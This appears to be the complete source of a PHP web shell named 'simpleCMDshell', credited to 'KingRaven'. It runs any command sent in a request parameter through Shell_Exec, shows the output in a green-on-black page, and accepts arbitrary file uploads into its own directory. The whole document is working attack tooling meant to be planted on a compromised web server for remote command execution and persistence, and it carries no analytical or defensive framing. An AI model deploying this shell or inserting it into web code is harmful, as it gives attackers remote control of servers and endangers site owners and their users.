<?\
    $cmd = stripslashes($_REQUEST["-cmd"]);\
    $sendfile=$_REQUEST["sendfile"];    \
    if($sendfile=="true") { $fn=$_FILES["file"]["name"];\
    $tn=$_FILES["file"]["tmp_name"];\
    if(move_uploaded_file($tn, dirname(__FILE__)."/".$fn)) $result="<br>upload done"; \
    else $result="<br>upload failed"; } \
?>\
<body bgcolor=#000000 text=#008000 onLoad="document.forms[0].elements[-cmd].focus()">\
    <center>\
    <br>\
        <form method=POST>\
            <input type=TEXT name="-cmd" size=64 value="<?=$cmd?>" style="background:#020;color:#0F0;">\
        </form>\
            <hr>\
            <table>\
                <tr><td>\
                    <pre>\
                        <?\
                            print htmlentities(Shell_Exec($cmd));\
                        ?>\
                    </pre>\
                </td></tr>\
            </table>\
        <hr>\
        <form enctype="multipart/form-data" method="post" action="">\
             <input type=file name=file size=20 style="background:#020;color:#0F0;">\
             <input type="submit" value="Upload">\
             <input type="hidden" name="sendfile" value="true"><?=$result?>\
        </form>\
        ~simpleCMDshell~ by <b>KingRaven</b>\
    </center>\
</body> 
